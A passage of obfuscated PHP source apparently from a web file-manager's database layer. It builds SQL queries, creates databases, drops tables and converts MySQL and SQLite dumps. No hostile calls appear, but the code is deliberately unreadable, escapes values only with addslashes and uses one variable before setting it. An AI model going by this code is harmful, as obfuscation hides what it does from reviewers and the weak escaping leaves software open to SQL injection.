(isset($‚îğĞƒĞ[$èëÂİÊ[345]])) { $¶½›‹‚ = $èëÂİÊ[1029]; unset($‚îğĞƒĞ[$èëÂİÊ[345]]); } else { $¶½›‹‚ = $èëÂİÊ[1030]; } foreach ($‚îğĞƒĞ as $‡ˆÄæ´Æ) { $èÃæÎÀÈ[] = $¶½›‹‚ . (is_array($‡ˆÄæ´Æ) ? $this->buildSelectSql($‡ˆÄæ´Æ) : $‡ˆÄæ´Æ); } return implode($èëÂİÊ[53], $èÃæÎÀÈ); } public function insert($˜ü¸ñÓˆ, $»Ä®Éî = array(), $¿™ÛÃÓ˜ = false) { $ä»À³ˆ’ =& $_SERVER[Æ š¦İÈ]; $ªÉîŒ…ß = $·è¤›Ê = array(); $this->model = $»Ä®Éî[$ä»À³ˆ’[278]]; foreach ($˜ü¸ñÓˆ as $Ğ±Û÷° => $äŒâŒ—³) { if (is_array($äŒâŒ—³) && $ä»À³ˆ’[294] == $äŒâŒ—³[0]) { $·è¤›Ê[] = $this->parseKey($Ğ±Û÷°); $ªÉîŒ…ß[] = $äŒâŒ—³[1]; } elseif (is_scalar($äŒâŒ—³) || is_null($äŒâŒ—³)) { $·è¤›Ê[] = $this->parseKey($Ğ±Û÷°); $ªÉîŒ…ß[] = $this->parseValue($äŒâŒ—³); } } $¹ğÏÈ¶ì = ($¿™ÛÃÓ˜ ? $ä»À³ˆ’[898] : $ä»À³ˆ’[899]) . $ä»À³ˆ’[900] . $this->parseTable($»Ä®Éî[$ä»À³ˆ’[276]]) . $ä»À³ˆ’[894] . implode($ä»À³ˆ’[50], $·è¤›Ê) . $ä»À³ˆ’[895] . implode($ä»À³ˆ’[50], $ªÉîŒ…ß) . $ä»À³ˆ’[896]; $¹ğÏÈ¶ì .= $this->parseLock(isset($»Ä®Éî[$ä»À³ˆ’[840]]) ? $»Ä®Éî[$ä»À³ˆ’[840]] : !1); $¹ğÏÈ¶ì .= $this->parseComment(!empty($»Ä®Éî[$ä»À³ˆ’[351]]) ? $»Ä®Éî[$ä»À³ˆ’[351]] : $ä»À³ˆ’[12]); return $this->execute($¹ğÏÈ¶ì, $this->parseBind(!empty($»Ä®Éî[$ä»À³ˆ’[282]]) ? $»Ä®Éî[$ä»À³ˆ’[282]] : array())); } public function selectInsert($¡¹»—äŞ, $×Üæ…¹‹, $³ï¹ßÜÄ = array()) { $œš¼­„ =& $_SERVER[Æ š¦İÈ]; $this->model = $³ï¹ßÜÄ[$œš¼­„[278]]; if (is_string($¡¹»—äŞ)) { $¡¹»—äŞ = explode($œš¼­„[50], $¡¹»—äŞ); } array_walk($¡¹»—äŞ, array($this, $œš¼­„[897])); $°§úÄ¬ = $œš¼­„[1031] . $this->parseTable($×Üæ…¹‹) . $œš¼­„[894] . implode($œš¼­„[50], $¡¹»—äŞ) . $œš¼­„[1009]; $°§úÄ¬ .= $this->buildSelectSql($³ï¹ßÜÄ); return $this->execute($°§úÄ¬, $this->parseBind(!empty($³ï¹ßÜÄ[$œš¼­„[282]]) ? $³ï¹ßÜÄ[$œš¼­„[282]] : array())); } public function update($¤®«‡ü, $ ²…³øÉ) { $ÙÕ‘Ô“ =& $_SERVER[Æ š¦İÈ]; $this->model = $ ²…³øÉ[$ÙÕ‘Ô“[278]]; $£Å¦ÛÅÊ = $ÙÕ‘Ô“[1032] . $this->parseTable($ ²…³øÉ[$ÙÕ‘Ô“[276]]) . $this->parseSet($¤®«‡ü) . $this->parseWhere(!empty($ ²…³øÉ[$ÙÕ‘Ô“[272]]) ? $ ²…³øÉ[$ÙÕ‘Ô“[272]] : $ÙÕ‘Ô“[12]) . $this->parseOrder(!empty($ ²…³øÉ[$ÙÕ‘Ô“[362]]) ? $ ²…³øÉ[$ÙÕ‘Ô“[362]] : $ÙÕ‘Ô“[12]) . $this->parseLimit(!empty($ ²…³øÉ[$ÙÕ‘Ô“[289]]) ? $ ²…³øÉ[$ÙÕ‘Ô“[289]] : $ÙÕ‘Ô“[12]) . $this->parseLock(isset($ ²…³øÉ[$ÙÕ‘Ô“[840]]) ? $ ²…³øÉ[$ÙÕ‘Ô“[840]] : !1) . $this->parseComment(!empty($ ²…³øÉ[$ÙÕ‘Ô“[351]]) ? $ ²…³øÉ[$ÙÕ‘Ô“[351]] : $ÙÕ‘Ô“[12]); return $this->execute($£Å¦ÛÅÊ, $this->parseBind(!empty($ ²…³øÉ[$ÙÕ‘Ô“[282]]) ? $ ²…³øÉ[$ÙÕ‘Ô“[282]] : array())); } public function delete($ÌÁ½ì¾á = array()) { $¥îÔøïì =& $_SERVER[Æ š¦İÈ]; $this->model = $ÌÁ½ì¾á[$¥îÔøïì[278]]; $Û›Æå‡ = $¥îÔøïì[1033] . $this->parseTable($ÌÁ½ì¾á[$¥îÔøïì[276]]) . $this->parseWhere(!empty($ÌÁ½ì¾á[$¥îÔøïì[272]]) ? $ÌÁ½ì¾á[$¥îÔøïì[272]] : $¥îÔøïì[12]) . $this->parseOrder(!empty($ÌÁ½ì¾á[$¥îÔøïì[362]]) ? $ÌÁ½ì¾á[$¥îÔøïì[362]] : $¥îÔøïì[12]) . $this->parseLimit(!empty($ÌÁ½ì¾á[$¥îÔøïì[289]]) ? $ÌÁ½ì¾á[$¥îÔøïì[289]] : $¥îÔøïì[12]) . $this->parseLock(isset($ÌÁ½ì¾á[$¥îÔøïì[840]]) ? $ÌÁ½ì¾á[$¥îÔøïì[840]] : !1) . $this->parseComment(!empty($ÌÁ½ì¾á[$¥îÔøïì[351]]) ? $ÌÁ½ì¾á[$¥îÔøïì[351]] : $¥îÔøïì[12]); return $this->execute($Û›Æå‡, $this->parseBind(!empty($ÌÁ½ì¾á[$¥îÔøïì[282]]) ? $ÌÁ½ì¾á[$¥îÔøïì[282]] : array())); } public function select($öÆßêš = array()) { $š¤ÒÔºæ =& $_SERVER[Æ š¦İÈ]; $this->model = $öÆßêš[$š¤ÒÔºæ[278]]; $Ÿªíõñƒ = $this->buildSelectSql($öÆßêš); $Ôø‹š™Ä = isset($öÆßêš[$š¤ÒÔºæ[346]]) ? $öÆßêš[$š¤ÒÔºæ[346]] : !1; if ($Ôø‹š™Ä) { $Ô–µÛõé = is_string($Ôø‹š™Ä[$š¤ÒÔºæ[95]]) ? $Ôø‹š™Ä[$š¤ÒÔºæ[95]] : $š¤ÒÔºæ[1034] . md5($Ÿªíõñƒ); $ÒÃ™¬Ä¤ = think_cache($Ô–µÛõé, $š¤ÒÔºæ[12], $Ôø‹š™Ä); if (!1 !== $ÒÃ™¬Ä¤) { return $ÒÃ™¬Ä¤; } } $â°”Ïùş = $this->query($Ÿªíõñƒ, $this->parseBind(!empty($öÆßêš[$š¤ÒÔºæ[282]]) ? $öÆßêš[$š¤ÒÔºæ[282]] : array())); if ($Ôø‹š™Ä && !1 !== $â°”Ïùş) { think_cache($Ô–µÛõé, $â°”Ïùş, $Ôø‹š™Ä); } return $â°”Ïùş; } public function buildSelectSql($ÈÙÛ³€ß = array()) { $Ÿİ’å’À =& $_SERVER[Æ š¦İÈ]; if (isset($ÈÙÛ³€ß[$Ÿİ’å’À[350]])) { if (strpos($ÈÙÛ³€ß[$Ÿİ’å’À[350]], $Ÿİ’å’À[50])) { list($ÏãÚÇ, $”öëµã) = explode($Ÿİ’å’À[50], $ÈÙÛ³€ß[$Ÿİ’å’À[350]]); } else { $ÏãÚÇ = $ÈÙÛ³€ß[$Ÿİ’å’À[350]]; } $ÏãÚÇ = $ÏãÚÇ ? $ÏãÚÇ : 1; $”öëµã = isset($”öëµã) ? $”öëµã : (is_numeric($ÈÙÛ³€ß[$Ÿİ’å’À[289]]) ? $ÈÙÛ³€ß[$Ÿİ’å’À[289]] : 20); $à ¾Ó¨Ñ = $”öëµã * ((int) $ÏãÚÇ - 1); $ÈÙÛ³€ß[$Ÿİ’å’À[289]] = $à ¾Ó¨Ñ . $Ÿİ’å’À[50] . $”öëµã; } if (think_config($Ÿİ’å’À[1035])) { $÷—öôÇÆ = $Ÿİ’å’À[1036] . md5(serialize($ÈÙÛ³€ß)); $è—¶â°Ù = think_cache($÷—öôÇÆ); if ($è—¶â°Ù) { return $è—¶â°Ù; } } $—¼ÂÃçÎ = $this->parseSql($this->selectSql, $ÈÙÛ³€ß); $—¼ÂÃçÎ .= $this->parseLock(isset($ÈÙÛ³€ß[$Ÿİ’å’À[840]]) ? $ÈÙÛ³€ß[$Ÿİ’å’À[840]] : !1); if (isset($÷—öôÇÆ)) { think_cache($÷—öôÇÆ, $—¼ÂÃçÎ); } return $—¼ÂÃçÎ; } public function parseSql($×Û ï¹², $ñÚşŞ–× = array()) { $Şö÷µÒ¿ =& $_SERVER[Æ š¦İÈ]; $×Û ï¹² = str_replace(array($Şö÷µÒ¿[1037], $Şö÷µÒ¿[1038], $Şö÷µÒ¿[1039], $Şö÷µÒ¿[1040], $Şö÷µÒ¿[1041], $Şö÷µÒ¿[1042], $Şö÷µÒ¿[1043], $Şö÷µÒ¿[1044], $Şö÷µÒ¿[1045], $Şö÷µÒ¿[1046], $Şö÷µÒ¿[1047]), array($this->parseTable("{$ñÚşŞ–×[$Şö÷µÒ¿[276]]}"), $this->parseDistinct(isset($ñÚşŞ–×[$Şö÷µÒ¿[1048]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[1048]] : !1), $this->parseField(!empty($ñÚşŞ–×[$Şö÷µÒ¿[270]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[270]] : $Şö÷µÒ¿[183]), $this->parseJoin(!empty($ñÚşŞ–×[$Şö÷µÒ¿[279]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[279]] : $Şö÷µÒ¿[12]), $this->parseWhere(!empty($ñÚşŞ–×[$Şö÷µÒ¿[272]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[272]] : $Şö÷µÒ¿[12]), $this->parseGroup(!empty($ñÚşŞ–×[$Şö÷µÒ¿[517]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[517]] : $Şö÷µÒ¿[12]), $this->parseHaving(!empty($ñÚşŞ–×[$Şö÷µÒ¿[1049]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[1049]] : $Şö÷µÒ¿[12]), $this->parseOrder(!empty($ñÚşŞ–×[$Şö÷µÒ¿[362]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[362]] : $Şö÷µÒ¿[12]), $this->parseLimit(!empty($ñÚşŞ–×[$Şö÷µÒ¿[289]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[289]] : $Şö÷µÒ¿[12]), $this->parseUnion(!empty($ñÚşŞ–×[$Şö÷µÒ¿[344]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[344]] : $Şö÷µÒ¿[12]), $this->parseComment(!empty($ñÚşŞ–×[$Şö÷µÒ¿[351]]) ? $ñÚşŞ–×[$Şö÷µÒ¿[351]] : $Şö÷µÒ¿[12])), $×Û ï¹²); return $×Û ï¹²; } public function getLastSql($­»„åŠÇ = '') { return $­»„åŠÇ ? $this->modelSql[$­»„åŠÇ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($òê©ÆƒÒ) { return addslashes($òê©ÆƒÒ); } public function setModel($ç¸ÄŸúí) { $this->model = $ç¸ÄŸúí; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Ùï€›—¯ = array()) { $šØ•£Èú =& $_SERVER[Æ š¦İÈ]; if (empty($Ùï€›—¯)) { $Ùï€›—¯ = $GLOBALS[$šØ•£Èú[6]][$šØ•£Èú[21]]; } $this->database = $Ùï€›—¯; } public function model($ÊÑÒ½Ëñ = '') { return new ModelBase($ÊÑÒ½Ëñ, $_SERVER[Æ š¦İÈ][12], $this->database); } public function db($İÏ¡ş¨£ = false) { $ Ã™Ä’– =& $_SERVER[Æ š¦İÈ]; $æ©‹¨ì° = array_change_key_case($this->database); if ($this->dbType() == $ Ã™Ä’–[13] || !$İÏ¡ş¨£) { return $this->model()->db(); } $ıÁÕíÙâ = $æ©‹¨ì°[$ Ã™Ä’–[963]]; $æ©‹¨ì°[$ Ã™Ä’–[963]] = $ Ã™Ä’–[12]; if ($æ©‹¨ì°[$ Ã™Ä’–[958]] == $ Ã™Ä’–[955]) { $˜€±ı« = $æ©‹¨ì°[$ Ã™Ä’–[964]]; $æ©‹¨ì°[$ Ã™Ä’–[964]] = substr($˜€±ı«, 0, strrpos($˜€±ı«, $ Ã™Ä’–[1050])); } $this->database = $æ©‹¨ì°; $ûîÏ–Ç = $this->model()->db(); try { $›ôÀ†µ× = $ûîÏ–Ç->execute("\x73\150\x6f\167\40\144\x61\164\141\142\141\x73\145\163\x20\154\151\153\x65\x20\47{$ıÁÕíÙâ}\47"); } catch (Exception $ÛÃ€§äç) { } if (!$›ôÀ†µ×) { $ûîÏ–Ç->execute("\143\162\145\141\164\145\40\144\141\164\141\142\x61\x73\145\40\140{$ıÁÕíÙâ}\x60"); } $æ©‹¨ì°[$ Ã™Ä’–[963]] = $ıÁÕíÙâ; if ($æ©‹¨ì°[$ Ã™Ä’–[958]] == $ Ã™Ä’–[955]) { $æ©‹¨ì°[$ Ã™Ä’–[964]] .= $ Ã™Ä’–[1050] . $ıÁÕíÙâ; } $this->database = $æ©‹¨ì°; $ûîÏ–Ç->execute("\x75\163\145\40\x60{$ıÁÕíÙâ}\140"); return $ûîÏ–Ç; } public function createTable($€ÔÔ‹ÔŸ, &$‰æÄÕÇ) { $ŠÅ—ñ‹Ò =& $_SERVER[Æ š¦İÈ]; if (!IO::exist($€ÔÔ‹ÔŸ)) { ActionCall($ŠÅ—ñ‹Ò[1051], !0, 0); show_json(LNG($ŠÅ—ñ‹Ò[1052]), !1); } $îâù—ˆô = $this->model()->db(); $„ñœó ¹ = sqlSplit(IO::getContent($€ÔÔ‹ÔŸ)); foreach ($„ñœó ¹ as $ŠÖúù¬) { $¢ô½‡ÁÔ = stripos($ŠÖúù¬, $ŠÅ—ñ‹Ò[1053]) === 0; if ($¢ô½‡ÁÔ) { $‰æÄÕÇ->task[$ŠÅ—ñ‹Ò[783]] += 1; } $îâù—ˆô->execute($ŠÖúù¬); if ($¢ô½‡ÁÔ) { preg_match($ŠÅ—ñ‹Ò[1054], $ŠÖúù¬, $•ª…±ÈÖ); $‰æÄÕÇ->task[$ŠÅ—ñ‹Ò[1055]] = $•ª…±ÈÖ[1]; $‰æÄÕÇ->update(1); } } } public function insertTable($ĞÊ¯õòË, &$¾¹«Á€) { $İ’„¥Àï =& $_SERVER[Æ š¦İÈ]; $úÖúš÷İ = $this->model()->db(); $šş¾£ÛÀ = $“ŸÅ³¬ô ? array($“ŸÅ³¬ô) : $úÖúš÷İ->getTables(); foreach ($ĞÊ¯õòË as $ı‡ô©¡) { $“ŸÅ³¬ô = basename($ı‡ô©¡, $İ’„¥Àï[785]); if (!in_array($“ŸÅ³¬ô, $šş¾£ÛÀ)) { continue; } $¾¹«Á€->task[$İ’„¥Àï[1055]] = $“ŸÅ³¬ô; if (get_filesize($ı‡ô©¡) == 0) { continue; } $Î“·Î…¹ = $this->sqlToDb($ı‡ô©¡, $¾¹«Á€); if (!$Î“·Î…¹) { ActionCall($İ’„¥Àï[1051], !0, 0); show_json(LNG($İ’„¥Àï[1056]) . "\x5b{$“ŸÅ³¬ô}\x5d", !1); } } } public function sqlFromDb($ô³şëÁº, $æ ¶‰Øƒ, &$ışà×¸Ã, $ï¦ —ò = '') { if ($ışà×¸Ã) { $ışà×¸Ã->task[$_SERVER[Æ š¦İÈ][1055]] = $ô³şëÁº; } $ö€—©ÏÓ = $this->model($ô³şëÁº); $§°Ú‰Ï¤ = 0; $³¾ôÂùî = 0; $şí»’ñì = 10000; $Ÿû·«¸ = fopen($æ ¶‰Øƒ, $_SERVER[Æ š¦İÈ][1057]); $ğ«©š· = $ö€—©ÏÓ->getPk(); $¢¼­ùä“ = $ö€—©ÏÓ->getDbFields(); $Ì£ÅÍ÷È = $_SERVER[Æ š¦İÈ][12]; if ($GLOBALS[$_SERVER[Æ š¦İÈ][784]] && in_array($ô³şëÁº, array($_SERVER[Æ š¦İÈ][1058], $_SERVER[Æ š¦İÈ][1059]))) { $Ì£ÅÍ÷È = $ô³şëÁº; } do { $Ÿ¼Ç®í‹ = array($ğ«©š· => array($_SERVER[Æ š¦İÈ][1005], $³¾ôÂùî)); $õİ§¸´Ü = $ö€—©ÏÓ->where($Ÿ¼Ç®í‹)->field($¢¼­ùä“)->order($ğ«©š· . $_SERVER[Æ š¦İÈ][1060])->limit($şí»’ñì)->select(); $õİ§¸´Ü = !empty($õİ§¸´Ü) ? $õİ§¸´Ü : array(); if (!($™‚ò€Œ = count($õİ§¸´Ü))) { break; } $ë€Á¾à = end($õİ§¸´Ü); $³¾ôÂùî = $ë€Á¾à[$ğ«©š·]; $„õé£´ = array(); foreach ($õİ§¸´Ü as $…şÈıÖİ) { if ($Ì£ÅÍ÷È) { if ($ô³şëÁº == $_SERVER[Æ š¦İÈ][1058]) { if ($…şÈıÖİ[$_SERVER[Æ š¦İÈ][33]] == $_SERVER[Æ š¦İÈ][1061]) { $¾ĞÌÂÕß = json_decode($…şÈıÖİ[$_SERVER[Æ š¦İÈ][371]], !0); if ($¾ĞÌÂÕß[$_SERVER[Æ š¦İÈ][32]] == $GLOBALS[$_SERVER[Æ š¦İÈ][784]] && $¾ĞÌÂÕß[$_SERVER[Æ š¦İÈ][747]] != 1) { continue; } } } else { if ($…şÈıÖİ[$_SERVER[Æ š¦İÈ][33]] == $_SERVER[Æ š¦İÈ][1062] && $…şÈıÖİ[$_SERVER[Æ š¦İÈ][95]] == $_SERVER[Æ š¦İÈ][776]) { continue; } } } if ($ï¦ —ò) { $…şÈıÖİ[$_SERVER[Æ š¦İÈ][78]] = "\173\x69\x6f\72{$ï¦ —ò}\175" . substr($…şÈıÖİ[$_SERVER[Æ š¦İÈ][78]], strlen("\173\x69\x6f\72{$…şÈıÖİ[$_SERVER[Æ š¦İÈ][814]]}\175")); $…şÈıÖİ[$_SERVER[Æ š¦İÈ][814]] = $ï¦ —ò; } $„õé£´[] = $_SERVER[Æ š¦İÈ][1063] . $this->sqlEncode($…şÈıÖİ) . $_SERVER[Æ š¦İÈ][1064]; } $ŸÉöŠœ¨ = "\x49\x4e\123\105\x52\124\x20\111\116\124\x4f\x20\140{$ô³şëÁº}\x60\x20\x28\140" . implode($_SERVER[Æ š¦İÈ][1065], $¢¼­ùä“) . $_SERVER[Æ š¦İÈ][1066]; fwrite($Ÿû·«¸, $ŸÉöŠœ¨ . implode($_SERVER[Æ š¦İÈ][1067], $„õé£´) . $_SERVER[Æ š¦İÈ][71] . PHP_EOL); $§°Ú‰Ï¤ += $™‚ò€Œ; if ($ışà×¸Ã) { $ışà×¸Ã->update($™‚ò€Œ); } } while ($şí»’ñì == $™‚ò€Œ); fclose($Ÿû·«¸); return $§°Ú‰Ï¤; } public function sqlToDb($õ×è‹ĞÇ, &$µşÁòßò) { $Õ×Ñ§³ =& $_SERVER[Æ š¦İÈ]; $‚¨ç¯ß = $this->model()->db(); $œışÙù = @fopen($õ×è‹ĞÇ, $Õ×Ñ§³[1068]); if (!$œışÙù) { return !1; } $ëú‚õê = 0; $Ñ°”Îï® = $Õ×Ñ§³[12]; $Ïæˆå¨û = array(); $í­©Æ®  = $this->dbType(); $é×àÜ­ = $í­©Æ®  == $Õ×Ñ§³[13] ? 500 : 2000; $¹¡å‡â = basename($õ×è‹ĞÇ, $Õ×Ñ§³[785]); $¹¤ù¦çÈ = 0; $·ÖÇ‰àå = 4194304 - 104858; $¹Š¿–›ˆ = 1000000 - 104858; while (!feof($œışÙù)) { $òğÂ¹™¦ = trim(fgets($œışÙù)); if (!$òğÂ¹™¦) { continue; } $”§ê©¬ = $this->sqlDecode($òğÂ¹™¦, $í­©Æ® , $¹¡å‡â); if (stripos($”§ê©¬, $Õ×Ñ§³[352]) === 0) { if (!$Ñ°”Îï®) { $Ñ°”Îï® = $”§ê©¬ . $Õ×Ñ§³[53]; } continue; } if ($µşÁòßò) { $µşÁòßò->task[$Õ×Ñ§³[783]] += 1; } $ëú‚õê++; $Ïæˆå¨û[] = rtrim(rtrim(trim($”§ê©¬), $Õ×Ñ§³[50]), $Õ×Ñ§³[71]); $½çÔ†Û„ = null; $©¨ªé·— = strlen($”§ê©¬); $¹¤ù¦çÈ += $©¨ªé·—; if ($¹¤ù¦çÈ >= ($é×àÜ­ == 500 ? $¹Š¿–›ˆ : $·ÖÇ‰àå)) { $½çÔ†Û„ = array_pop($Ïæˆå¨û); if ($ëú‚õê > 1) { $ëú‚õê--; } } if ($ëú‚õê >= $é×àÜ­ || $½çÔ†Û„) { $”§ê©¬ = $Ñ°”Îï® . implode($Õ×Ñ§³[50], $Ïæˆå¨û); if (!$‚¨ç¯ß->execute($”§ê©¬)) { return !1; } if ($µşÁòßò) { $µşÁòßò->update($ëú‚õê); } $Ïæˆå¨û = array(); $ëú‚õê = 0; $¹¤ù¦çÈ = 0; if ($½çÔ†Û„) { $Ïæˆå¨û = array($½çÔ†Û„); $ëú‚õê = 1; $¹¤ù¦çÈ = $©¨ªé·—; } } } fclose($œışÙù); if (!empty($Ïæˆå¨û)) { $”§ê©¬ = $Ñ°”Îï® . implode($Õ×Ñ§³[50], $Ïæˆå¨û); if (!$‚¨ç¯ß->execute($”§ê©¬)) { return !1; } if ($µşÁòßò) { $µşÁòßò->update($ëú‚õê); } } return !0; } public function dropTable($–Ø†¹î = null) { $şˆ€€÷‹ = $this->model()->db(); $ìï’ú¨Ö = $–Ø†¹î ? array($–Ø†¹î) : $şˆ€€÷‹->getTables(); if (!$ìï’ú¨Ö) { return; } foreach ($ìï’ú¨Ö as $–Ø†¹î) { if ($–Ø†¹î) { $–Ø†¹î = strtolower($–Ø†¹î); } else { continue; } $şˆ€€÷‹->execute("\x64\162\157\160\40\164\141\x62\x6c\145\x20\151\146\x20\x65\x78\151\x73\164\163\40\140{$–Ø†¹î}\140"); } } private function sqlEncode($òı¯ö¡æ) { $õÎâÁÎå =& $_SERVER[Æ š¦İÈ]; $Å«”šìç = array(); foreach ($òı¯ö¡æ as $„õË—íù) { if (is_array($„õË—íù)) { $„õË—íù = json_encode_force($„õË—íù); } $„õË—íù = addslashes($„õË—íù); $„õË—íù = str_replace(array($õÎâÁÎå[1069], $õÎâÁÎå[228]), array($õÎâÁÎå[1070], $õÎâÁÎå[1071]), $„õË—íù); $Å«”šìç[] = str_replace($õÎâÁÎå[58], $õÎâÁÎå[1072], $„õË—íù); } return $õÎâÁÎå[58] . implode($õÎâÁÎå[1073], $Å«”šìç) . $õÎâÁÎå[58]; } private function sqlDecode($§…ûÉä, $ƒÙ’Ï¯, $Ù’»õ¾÷ = '') { $­ÕäÔ½Ç =& $_SERVER[Æ š¦İÈ]; $§…ûÉä = str_replace(array($­ÕäÔ½Ç[1070], $­ÕäÔ½Ç[1071]), array($­ÕäÔ½Ç[1069], $­ÕäÔ½Ç[228]), $§…ûÉä); if ($ƒÙ’Ï¯ == $­ÕäÔ½Ç[13]) { return $Ù’»õ¾÷ != $­ÕäÔ½Ç[1074] ? stripslashes($§…ûÉä) : $§…ûÉä; } if ($Ù’»õ¾÷ == $­ÕäÔ½Ç[1074]) { $§…ûÉä = str_replace($­ÕäÔ½Ç[1075], $­ÕäÔ½Ç[119], stripslashes($§…ûÉä)); } return $§…ûÉä; } public function getSqlFile($ïÍÊş§î = '') { $ÆÚ‰áÚƒ =& $_SERVER[Æ š¦İÈ]; $ Ş¿Ä³€ = $this->dbType(!0); $¾ºäÃŞ = CONTROLLER_DIR . "\151\x6e\x73\164\141\x6c\x6c\x2f\144\x61\164\x61\x2f{$ Ş¿Ä³€}\x2e\x73\x71\154"; $ÙÕ†÷¸¨ = file_get_contents($¾ºäÃŞ); $Î¦Š›ş = $ÆÚ‰áÚƒ[1076] . ($ Ş¿Ä³€ == $ÆÚ‰áÚƒ[801] ? $ÆÚ‰áÚƒ[1077] : $ÆÚ‰áÚƒ[1078]) . $ÆÚ‰áÚƒ[1079]; preg_match_all($Î¦Š›ş, $ÙÕ†÷¸¨, $ù¢Á”); $éÖµµä˜ = $ù¢Á”[1]; $ä°ÙòÁÇ = $this->model()->db(); $Âºƒ¾¹Û = $ä°ÙòÁÇ->getTables(); $ÔÈãûÀ = TEMP_FILES . $ÆÚ‰áÚƒ[1080] . date($ÆÚ‰áÚƒ[748]) . $ÆÚ‰áÚƒ[8]; del_dir($ÔÈãûÀ); mk_dir($ÔÈãûÀ); $§„–¾… = $ÔÈãûÀ . $ÆÚ‰áÚƒ[1081]; $ØÉíû¸ò = $ÔÈãûÀ . $ÆÚ‰áÚƒ[1082]; $úùá½È = $ Ş¿Ä³€ == $ÆÚ‰áÚƒ[13] ? $ÆÚ‰áÚƒ[801] : $ÆÚ‰áÚƒ[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\x74\x61\154\154\x2f\x64\141\164\141\x2f{$úùá½È}\56\x73\x71\x6c", $ÔÈãûÀ); @touch($ÔÈãûÀ . $ Ş¿Ä³€ . $ÆÚ‰áÚƒ[785]); $’Á¶³ˆÛ = fopen($§„–¾…, $ÆÚ‰áÚƒ[1057]); $€ıµŠ„Ã = fopen($ØÉíû¸ò, $ÆÚ‰áÚƒ[1057]); if ($ Ş¿Ä³€ == $ÆÚ‰áÚƒ[13]) { $Âºƒ¾¹Û = array_diff($Âºƒ¾¹Û, array($ÆÚ‰áÚƒ[781], $ÆÚ‰áÚƒ[782])); $¸’²«¹ô = array($ÆÚ‰áÚƒ[1083], $ÆÚ‰áÚƒ[1084], $ÆÚ‰áÚƒ[1085]); fwrite($€ıµŠ„Ã, implode(PHP_EOL, $¸’²«¹ô) . PHP_EOL . PHP_EOL); foreach ($Âºƒ¾¹Û as $ØÏ’”åÙ) { $®îô× = $this->sqlFromSqlite($ØÏ’”åÙ); if (!$®îô×[$ÆÚ‰áÚƒ[13]]) { continue; } fwrite($€ıµŠ„Ã, $®îô×[$ÆÚ‰áÚƒ[13]] . PHP_EOL . PHP_EOL); if (!in_array($ØÏ’”åÙ, $éÖµµä˜)) { fwrite($’Á¶³ˆÛ, $®îô×[$ÆÚ‰áÚƒ[801]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Âºƒ¾¹Û as $ØÏ’”åÙ) { $®îô× = $this->sqlFromMysql($ØÏ’”åÙ); if (!$®îô×[$ÆÚ‰áÚƒ[801]]) { continue; } fwrite($’Á¶³ˆÛ, $®îô×[$ÆÚ‰áÚƒ[801]] . PHP_EOL . PHP_EOL); if (!in_array($ØÏ’”åÙ, $éÖµµä˜)) { fwrite($€ıµŠ„Ã, $®îô×[$ÆÚ‰áÚƒ[13]] . PHP_EOL . PHP_EOL); } } } fclose($’Á¶³ˆÛ); fclose($€ıµŠ„Ã); $ÙÕ†÷¸¨ = array($ÆÚ‰áÚƒ[801] => $§„–¾…, $ÆÚ‰áÚƒ[13] => $ØÉíû¸ò); return $ïÍÊş§î ? $ÙÕ†÷¸¨[$ïÍÊş§î] : $ÙÕ†÷¸¨; } public function dbType($à«š»•ë = false) { $ßäñê‡ =& $_SERVER[Æ š¦İÈ]; $½Í± ² = $à«š»•ë ? $GLOBALS[$ßäñê‡[6]][$ßäñê‡[21]] : $this->database; $½Í± ² = array_change_key_case($½Í± ²); $Ç—‹³üş = $½Í± ²[$ßäñê‡[958]]; if ($Ç—‹³üş == $ßäñê‡[955]) { $»İÕÖ¾ú = explode($ßäñê‡[4], $½Í± ²[$ßäñê‡[964]]); $Ç—‹³üş = $»İÕÖ¾ú[0]; } $ä»Üœó“ = array($ßäñê‡[1086] => $ßäñê‡[13], $ßäñê‡[903] => $ßäñê‡[801]); if (isset($ä»Üœó“[$Ç—‹³üş])) { $Ç—‹³üş = $ä»Üœó“[$Ç—‹³üş]; } return $Ç—‹³üş; } public function sqlFromMysql($¶Ãš‚Ú˜, $Õø‹†ú§ = '') { $Œ…›°ï =& $_SERVER[Æ š¦İÈ]; $‡ôò½Ş = $this->model()->db(); $­Ï„±ÉÊ = $‡ôò½Ş->query($Œ…›°ï[1087] . $¶Ãš‚Ú˜ . $Œ…›°ï[382]); if (!$­Ï„±ÉÊ || !$­Ï„±ÉÊ[0]) { return !1; } $á²Ëİ³ = _get($­Ï„±ÉÊ[0], $Œ…›°ï[1088], $Œ…›°ï[12]); if (!$á²Ëİ³) { return !1; } $öªüÑı¾ = "\104\122\117\x50\40\x54\x41\102\114\105\40\111\106\x20\105\x58\x49\123\x54\123\40\x60{$¶Ãš‚Ú˜}\x60\x3b" . PHP_EOL . $á²Ëİ³ . $Œ…›°ï[71]; if ($Õø‹†ú§ && $Õø‹†ú§ == $Œ…›°ï[801]) { return $öªüÑı¾; } $×€ññÓˆ = array_change_key_case($GLOBALS[$Œ…›°ï[6]][$Œ…›°ï[21]]); $‚şÃöã™ = $×€ññÓˆ[$Œ…›°ï[963]]; $Ï¶„±© = $Œ…›°ï[1089] . $‚şÃöã™ . $Œ…›°ï[1090] . $¶Ãš‚Ú˜ . $Œ…›°ï[58]; $›±û²÷Í = $Œ…›°ï[1091] . $¶Ãš‚Ú˜ . $Œ…›°ï[891]; $ğŠô¾ã‹ = $‡ôò½Ş->query($Ï¶„±©); if (empty($ğŠô¾ã‹)) { $·×–®å = array($Œ…›°ï[801] => $Œ…›°ï[12], $Œ…›°ï[13] => $Œ…›°ï[12]); return $Õø‹†ú§ ? $·×–®å[$Õø‹†ú§] : $·×–®å; } $½Å¬ş—¿ = $‡ôò½Ş->query($›±û²÷Í); $ÇóœÔï‰ = $Œ…›°ï[12]; $É‰„ÆùÔ = array(); foreach ($½Å¬ş—¿ as $¡ê¢º’÷) { if 